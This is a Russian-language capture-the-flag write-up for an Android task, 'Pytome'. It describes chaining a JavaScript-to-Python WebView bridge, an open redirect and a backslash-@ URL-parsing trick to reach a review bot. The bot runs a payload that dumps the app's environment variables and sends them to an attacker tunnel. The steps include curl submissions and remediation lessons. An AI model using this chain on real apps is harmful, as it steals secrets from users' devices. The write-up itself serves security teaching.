# Pytome — write-up (task7)

**Avito CTF 2026 · категория «Android / mobile»**
**Цель:** слить переменную окружения `FLAG` из мобильного приложения-обучалки Python.
**Дано:** `pytome.apk` (~60 МБ). Бэкенд (в APK его нет): `https://pytome-57ymra6o.avitoctf.ru`.

---

## 1. Разведка (ход мысли, по шагам)

Это не «одна дырка», а цепочка из нескольких звеньев. Вот как она собиралась.

**1) APK на 60 МБ — подозрительно много.** Распаковал (`unzip pytome.apk -d extracted/`) и увидел:

- `extracted/lib/{arm64-v8a,x86_64,...}/libpython3.11.so`, `libchaquopy_java.so`, `libssl_python.so`;
- каталог `extracted/assets/chaquopy/` (`bootstrap.imy`, `stdlib-*.imy`, `app.imy`, `requirements-*.imy`).

Вывод: это **Chaquopy** — фреймворк, встраивающий настоящий **CPython 3.11** в Android-приложение. Значит приложение реально исполняет Python **на телефоне**, локально.

**2) Разбираем манифест.** `extracted/AndroidManifest.xml` — бинарный AXML; строки в UTF-16. Из него видно:

- пакет `ru.avitoctf.pytome`; активити `MainActivity`, `DocsActivity`, класс приложения `PytomeApplication`;
- **`usesCleartextTraffic`** включён (http-exfil тоже прошёл бы);
- разрешения `android.permission.INTERNET` и `android.permission.DUMP`;
- deep link: `intent-filter` с `action.VIEW` + `category.BROWSABLE`/`DEFAULT`, схема **`pytome`**, host **`docs`** → `pytome://docs`;
- обе активити **`exported`**.

**3) Ищем «песочницу» — а её нет.** Раз это «обучалка Python с защитой от пчёл-вайбкодеров», ждёшь фильтр опасного кода. Декомпилировал `extracted/classes.dex` (jadx) и нашёл в `ru.avitoctf.pytome`:

- `PythonEngine.execute(code)` — делает буквально `builtins.exec(code, ...)` и возвращает то, что напечаталось (через `redirect_stdout`). **Никаких проверок `import`/`os`/`environ` нет** — «защита» фейковая. Значит, если прогнать свой Python, `import os; print(os.environ['FLAG'])` сработает в лоб;
- `PythonEngine.setEnv(...)` — кладёт значение в `os.environ`.

**4) Где берётся FLAG?** В `MainActivity.onCreate`: `getIntent().getStringExtra("FLAG")` → уходит в `os.environ["FLAG"]`. То есть флаг задаётся **при запуске приложения на устройстве ревизора** (через Intent-extra). У нас в APK его нет — нужен рантайм-лик.

**5) Как заставить приложение выполнить НАШ Python?** Смотрю, кто вызывает `execute()`. Это `DocsActivity`: там `WebView` с `setJavaScriptEnabled(true)` и `addJavascriptInterface(new PythonBridge(), "AndroidBridge")`, где `@JavascriptInterface eval(code)` → `PythonEngine.execute(code)`. **Значит любой JavaScript в этом WebView исполняет произвольный Python** через `AndroidBridge.eval(...)`. Осталось подсунуть в WebView свою страницу.

**6) WebView пускает только доверенный хост — но проверка дырявая.** `DocsActivity` (exported, deep link `pytome://docs?url=...`) проверяет, что host **стартового** URL == `pytome-57ymra6o.avitoctf.ru`. Но клиент — дефолтный `WebViewClient()`, который **не переопределяет `shouldOverrideUrlLoading`**, поэтому JS-мост **сохраняется после редиректов и смены хоста**. Два способа обойти host-check:
- **открытый редирект** на доверенном хосте: `GET /go?to=<любой URL>` отдаёт 302 куда угодно;
- **дифференциал парсинга URL** через `\@`: в `https://<ATTACKER>\@pytome-57ymra6o.avitoctf.ru/x` бэкенд-проверка и WebView расходятся в том, что считать host'ом. В логе сервера это видно как загруженный путь `/@pytome-.../x` — поэтому наш сервер отвечает **на любом пути** (catch-all).

**7) Как доставить это боту?** На бэкенде есть форма `/docs/bug-report` — «пришли ссылку нашему медоеду-ревизору». Бот **автоматически открывает присланный URL в уязвимом приложении** (где FLAG уже в окружении). Круг замкнулся.

---

## 2. Уязвимость (root cause)

Опасна связка **exported WebView-активити + JS-мост, исполняющий произвольный код + слабый host-allowlist**:

- `addJavascriptInterface(PythonBridge, "AndroidBridge")` + `setJavaScriptEnabled(true)` даёт JS прямой доступ к `PythonEngine.execute` → произвольный Python в контексте приложения;
- `PythonEngine.execute` — голый `exec()` без всякой фильтрации;
- allowlist проверяет только **стартовый** URL, а дефолтный `WebViewClient` не валидирует навигацию → мост живёт после редиректа/смены хоста;
- на доверенном домене есть **open-redirect** `/go?to=` и работает **`\@`-дифференциал** — оба обнуляют host-проверку;
- доставку на устройство с секретом делает **бот-ревизор** через `/docs/bug-report`.

Итог цепочки: `pytome://docs?url=…` (или форма бота) → host-check обходится open-redirect'ом / `\@` → WebView грузит нашу страницу с живым `AndroidBridge` → произвольный Python → `os.environ['FLAG']` → exfil.

---

## 3. Эксплуатация шаг за шагом

Нужны: любой компьютер, Python 3 и способ показать боту страницу по HTTPS. В репозитории лежит готовый `task7/exploit_server.py`.

### Шаг 1. Что делает `exploit_server.py`

Это **catch-all** трап-сервер: на **любой** путь он отдаёт страницу-пейлоад `PAYLOAD_HTML`, а служебные `/probe`, `/exfil`, `/diag` логирует. Пейлоад делает не «читаю только FLAG», а надёжно:

- выполняет через мост `import os, json; print(json.dumps(dict(os.environ)))` — **дампит всё окружение** (FLAG внутри);
- не знает заранее имя моста, поэтому **перебирает кандидатов**: объекты `AndroidBridge, Android, Bridge, PythonBridge, Pytome, ...` и методы `eval, exec, execute, run, runPython, ...`; если мост есть — вызывает первый рабочий и шлёт результат на `/exfil`;
- если моста нет (обычный браузер) — шлёт диагностику на `/diag` со списком доступных объектов;
- exfil дублируется тремя каналами: `XMLHttpRequest`, `navigator.sendBeacon`, `new Image().src` → на `/exfil?d=...`;
- сервер функцией `find_flag` вырезает подстроку `avito{...}` и печатает `[FLAG] ...`.

```bash
python3 task7/exploit_server.py        # слушает http://127.0.0.1:8000, ждёт [serve] path='/@pytome-...' затем [FLAG]
```

### Шаг 2. Туннель наружу (HTTPS)

Как в докстринге сервера — cloudflared (ngrok тоже подойдёт):

```bash
cloudflared tunnel --url http://localhost:8000
# -> выдаст https-адрес вида https://<random>.trycloudflare.com  (это «наш хост»)
```

### Шаг 3. Собираем URL, обходящий host-check

Два рабочих варианта (host-check пройдёт, а WebView уедет к нам):

```
# (а) через открытый редирект доверенного хоста:
https://pytome-57ymra6o.avitoctf.ru/go?to=https://<random>.trycloudflare.com/x

# (б) через \@-дифференциал парсинга URL:
https://<random>.trycloudflare.com\@pytome-57ymra6o.avitoctf.ru/x
```

Доставить это можно как **deep link** `pytome://docs?url=<внутренний_url>` (бот открывает его в приложении) или напрямую через форму бота.

### Шаг 4. Отправляем ссылку боту-ревизору

Форма `POST /docs/bug-report`. Пример с `\@`-вариантом (все реальные поля формы):

```bash
curl -s https://pytome-57ymra6o.avitoctf.ru/docs/bug-report \
  --data-urlencode 'name=medoedik' \
  --data-urlencode 'email=medoedik@avito.ru' \
  --data-urlencode 'url=https://<random>.trycloudflare.com\@pytome-57ymra6o.avitoctf.ru/x' \
  --data-urlencode 'bug_type=other' \
  --data-urlencode 'description=review'
```

Вариант через открытый редирект (`/go?to=`):

```bash
curl -s https://pytome-57ymra6o.avitoctf.ru/docs/bug-report \
  --data-urlencode 'url=https://pytome-57ymra6o.avitoctf.ru/go?to=https://<random>.trycloudflare.com/x'
```

Ответ — «ЗАЯВКА #…, ожидаем ревизора». Rate-limit ~1 заявка в минуту.

### Шаг 5. Ловим флаг

Через несколько секунд бот открывает ссылку в приложении, наш JS дампит окружение и стучит на `/exfil`. В терминале с `exploit_server.py`:

```
[serve] path='/@pytome-...'   | БОТ(Android)
==================================================================
[FLAG] avito{pYThON_In_WEbv13w_1s_D4NGEroUs}   | БОТ(Android)
[full] {"FLAG":"avito{pYThON_In_WEbv13w_1s_D4NGEroUs}", ...}
==================================================================
```

Если за пару минут пусто — проверь, что туннель живой и адрес вставлен верно, и что заявка прошла (не словил rate-limit); можно отправить повторно. Признак «мост не нашёлся» — строка `[diag] ... NO_BRIDGE` (значит страницу открыл не бот, а обычный браузер).

---

## 4. Флаг

Флаг **не зашит в APK** — он кладётся в окружение приложения на устройстве бота-ревизора и достаётся **рантайм-ликом через бота**: значение появляется на твоём сервере после запуска эксплойта (строка `[FLAG] ...`).

```
avito{pYThON_In_WEbv13w_1s_D4NGEroUs}
```

---

## 5. Где логика в декомпиляции (пути к артефактам)

- Распаковка APK: `task7/extracted/`.
- `task7/extracted/classes.dex` — декомпилировать jadx'ом; классы `ru.avitoctf.pytome`:
  - `PythonEngine` — `execute()` (голый `exec`, без фильтра) и `setEnv()` (кладёт FLAG в `os.environ`);
  - `MainActivity` — чтение Intent-extra `FLAG` в `onCreate`;
  - `DocsActivity` — `WebView` + `addJavascriptInterface(..., "AndroidBridge")`, `@JavascriptInterface eval`, слабая host-проверка стартового URL.
- `task7/extracted/AndroidManifest.xml` — обе Activity `exported`, deep link `pytome://docs`, `usesCleartextTraffic`, разрешения INTERNET/DUMP.
- `task7/extracted/assets/chaquopy/` и `task7/extracted/lib/*/libpython3.11.so` — доказательство встроенного CPython.
- Бэкенд: `/docs/*` (страницы дергают `AndroidBridge.eval`), `/go?to=` (open redirect), `/docs/bug-report` (бот-ревизор).
- Эксплойт-сервер: `task7/exploit_server.py`.

---

## 6. Выводы / уроки

- Опасна связка `addJavascriptInterface` + `setJavaScriptEnabled(true)` на **exported**-активити с deep link, где мост исполняет произвольный код, а «allowlist» проверяет только **стартовый** URL.
- **Открытый редирект** на доверенном домене и **дифференциал парсинга URL** (`\@`) обнуляют host-проверку — потому эксплойт-сервер и сделан catch-all.
- **Как надо было:** не вешать нативные мосты на недоверенный контент; валидировать КАЖДУЮ навигацию в `WebViewClient.shouldOverrideUrlLoading`; не экспортировать активити с мостом; убрать open-redirect; не исполнять пользовательский Python голым `exec`.
- Практический приём при решении: не полагаться на одно имя моста и одну переменную — пейлоад **перебирает** имена объектов/методов и **дампит всё окружение**, а exfil дублируется тремя каналами; это резко повышает шанс с одной попытки (учитывая rate-limit бота).
